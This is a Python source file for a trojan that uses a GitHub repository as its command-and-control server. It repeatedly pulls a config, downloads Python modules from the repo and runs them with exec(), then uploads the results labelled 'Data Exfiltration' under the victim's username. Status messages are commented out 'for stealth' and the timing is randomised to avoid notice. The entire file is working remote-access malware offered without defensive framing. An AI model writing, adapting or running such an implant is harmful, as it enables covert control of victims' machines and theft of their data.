import base64
import github3
import json
import random
import sys
import threading
import time
import types
import getpass  # New: To get the username automatically
from datetime import datetime

# ---------------------------------------------------
# CONFIGURATION
# ---------------------------------------------------
TOKEN = "YOURTOKEN"
USER = "USERNAME"
REPO_NAME = "REPO"

# Unique ID for this specific Trojan instance
trojan_id = "trojan_" + str(random.randint(1000, 100000))


# ---------------------------------------------------
# CORE FUNCTIONS
# ---------------------------------------------------

def github_connect():
    gh = github3.login(token=TOKEN)
    return gh.repository(USER, REPO_NAME)


def get_file_contents(filepath):
    repo = github_connect()
    tree = repo.file_contents(filepath)
    return base64.b64decode(tree.content).decode('utf-8')


def get_trojan_config():
    config_json = get_file_contents("config/abc.json")
    return json.loads(config_json)


def store_module_result(data):
    # Connect to GitHub
    repo = github_connect()

    # 1. Get the current system username (e.g., 'root' or 'admin')
    current_user = getpass.getuser()

    # 2. Create the organized path: data/root/trojan_12345-TIMESTAMP.txt
    # GitHub will automatically create the folder 'root' if it doesn't exist!
    timestamp = datetime.now().strftime('%Y%m%d%H%M%S')
    remote_path = f"data/{current_user}/{trojan_id}-{timestamp}.txt"

    # 3. Encode data
    encoded_data = base64.b64encode(data.encode())

    # 4. Upload (Silent - no print)
    repo.create_file(remote_path, "Data Exfiltration", encoded_data)


def run_module(module_name):
    # print(f"[*] Loading module: {module_name}") # COMMENTED OUT FOR STEALTH

    try:
        module_code = get_file_contents(f"modules/{module_name}.py")
        new_module = types.ModuleType(module_name)
        exec(module_code, new_module.__dict__)
        sys.modules[module_name] = new_module

        result = new_module.run()

        if result:
            store_module_result(str(result))

    except Exception:
        # print(f"[!] Failed to run {module_name}: {e}") # COMMENTED OUT FOR STEALTH
        pass


# ---------------------------------------------------
# MAIN LOOP
# ---------------------------------------------------
def trojan_main():
    # print(f"[*] Trojan Engine Started (ID: {trojan_id})") # COMMENTED OUT FOR STEALTH

    while True:
        try:
            config = get_trojan_config()

            for task in config:
                t = threading.Thread(target=run_module, args=(task['module'],))
                t.start()
                time.sleep(random.randint(1, 5))

            # Sleep silently
            time.sleep(30)

        except Exception:
            # print(f"[!] Main Loop Error: {e}") # COMMENTED OUT FOR STEALTH
            time.sleep(30)


if __name__ == "__main__":
    trojan_main()
